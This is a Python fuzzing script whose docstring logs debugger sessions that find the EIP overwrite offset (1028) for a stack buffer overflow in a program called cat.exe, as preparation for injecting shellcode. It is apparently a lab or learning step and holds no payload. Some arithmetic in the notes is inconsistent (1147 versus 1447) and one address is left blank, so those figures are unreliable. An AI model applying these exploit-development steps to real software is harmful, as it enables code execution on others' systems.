"""

## `fuzz3.py`

### .. Test

* Prevent to have a stack underflow exception, which is 
  caused by writing beyond the stack boundary (see fuzz2.py).

```
> fuzz3.py
> ImmunityDebugger.exe cat.exe pattern.dat
```

### .. Result

 * Exception
```
Log data, item 0
 Address=33694232
 Message=[21:34:06] Access violation when executing [33694232]
```
 
 * Registers
```
EIP 33694232
```

 * Trying to execute memory at `33694232`. 
 _Looks alphanumeric, part of the pattern?_

```
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset 33694232
0BADF00D   Looking for 2Bi3 in pattern of 500000 bytes
0BADF00D    - Pattern 2Bi3 (0x33694232) found in cyclic pattern at position 1028
```

 * Where exactly in the stack is this?
```
0BADF00D   [+] Command used:
0BADF00D   !mona find -s 2Bi3
...
0BADF00D   [+] Results :
0019FE58     0x0019fe58 : 2Bi3 | startnull {PAGE_READWRITE} [Stack] <-- !!! STACK !!!
02614374     0x02614374 : 2Bi3 | ascii {PAGE_READWRITE}
0BADF00D       Found a total of 2 pointers
```

 * Perfect stack...
```
...
0019FA50   00000D0A  ....
0019FA54   41306141  Aa0A <-- !!! PATTERN START !!!
0019FA58   61413161  a1Aa
...
0019FE54   69423169  i1Bi
0019FE58   33694232  2Bi3 <-- !!! EXECUTED ADDRESS !!!
0019FE5C   42346942  Bi4B
...
0019FFF8   77423177  w1Bw 
0019FFFC   00774232  2Bw. <-- !!! PATTERN END !!!
001A0000                  <-- !!! STACK END !!!
```

 * And the other stack offsets are `0` and `1447` 
```
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset Aa0A
0BADF00D   Looking for Aa0A in pattern of 500000 bytes
0BADF00D    - Pattern Aa0A found in cyclic pattern at position 0
...
0BADF00D   [+] Command used:
0BADF00D   !mona pattern_offset w2Bw
0BADF00D   Looking for w2Bw in pattern of 500000 bytes
0BADF00D    - Pattern w2Bw found in cyclic pattern at position 1447
```

 * `1147 = 1148 - 1`
   Actually
   `1147 = 1152 - sizeOf_dword - sizeOf_char = 1152 - 4 - 1`

### .. Conclusion

 * Our pattern `Aa0A` found in the stack at address `0x`.
 * The address that's executed is at offset `1028` in the pattern.
 * The pattern ends at `1447 + 4 = 1551`.
 
> Is it possible to write shellcode to the stack?
  `fuzz4.py` will try to execute some code...
 
"""

from pattern import createPattern

position = 1448
sizeOf_dword = 4
sizeOf_char = 1
maximum = position + sizeOf_dword - sizeOf_char
pattern = createPattern(maximum)

with open('pattern.dat', 'w') as f:
	f.write(pattern)